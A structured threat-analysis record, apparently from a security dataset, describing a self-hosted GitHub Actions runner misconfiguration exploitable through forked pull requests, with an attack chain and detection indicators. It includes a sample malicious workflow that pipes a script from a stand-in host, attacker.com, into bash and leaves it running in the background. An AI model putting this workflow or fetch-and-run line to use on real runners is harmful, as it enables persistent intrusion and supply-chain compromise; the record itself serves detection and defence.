package_info.package_versions: All versions with default/non-ephemeral self-hosted runner configuration
package_info.why_malicious: The misconfiguration allows arbitrary code execution by untrusted contributors via forked pull requests, enabling attackers to persist malicious processes and potentially inject code into runner base images, resulting in a supply chain compromise for all users of the affected runners.

malicious_snippets.code_snippet:
name: Malicious Workflow
on: [pull_request]
jobs:
  malicious_job:
    runs-on: self-hosted
    steps:
      - name: Persist background process
        run: nohup bash -c 'curl http://attacker.com/payload.sh | bash &'
malicious_snippets.code_behavior: During CI/CD workflow execution triggered by a pull request, the code launches a background process on the self-hosted runner that downloads and executes a remote payload, persisting after the workflow completes.

malice_analysis.why_suspicious: The workflow allows arbitrary code execution from untrusted contributors, and the use of background processes enables persistence beyond the intended job lifecycle.
malice_analysis.violated_expectations: Normal workflows should only execute trusted code and should not persist processes after job completion. This behavior violates the isolation and trust boundaries expected in CI/CD environments.
malice_analysis.similar_legitimate_use: Background processes may be used for legitimate monitoring or build tasks, but only in trusted, internal workflows.
key_indicators: Arbitrary code execution from forked pull requests
Use of nohup/background processes for persistence

attack_chain.action: Attacker becomes a contributor by making a trivial change (e.g., typo fix) to the target repository.
attack_chain.leads_to: Ability to submit pull requests with workflows that will auto-execute.

attack_chain.action: Attacker submits a pull request with a modified workflow file that runs on a self-hosted runner.
attack_chain.leads_to: Malicious workflow is picked up by the self-hosted runner.

attack_chain.action: Malicious workflow executes, launching a background process that persists after the job completes.
attack_chain.leads_to: Attacker gains persistent code execution on the runner.

attack_chain.action: Attacker uses persistent access to inject malicious code into runner base images or exfiltrate secrets.
attack_chain.leads_to: Potential supply chain compromise for all users of the affected runners.

behavioral_signatures: CI/CD workflow jobs that launch background processes (e.g., nohup, &)
Workflows in public repositories that allow code execution from forked pull requests
Unexpected network connections initiated during or after workflow execution
file_indicators: .github/workflows/*.yml files modified in pull requests from new contributors
Presence of scripts or commands that use nohup, disown, or & to persist processes
network_indicators: Outbound connections to untrusted or external domains (e.g., attacker.com)
Unexpected downloads of remote scripts or binaries during workflow execution
detection_knowledge.how_to_detect: Monitor for workflow executions triggered by forked pull requests that launch background processes or initiate network connections to external domains. Audit workflow files for suspicious modifications, especially those enabling persistence or remote code execution. Enforce ephemeral runners and restrict workflow execution to trusted contributors.
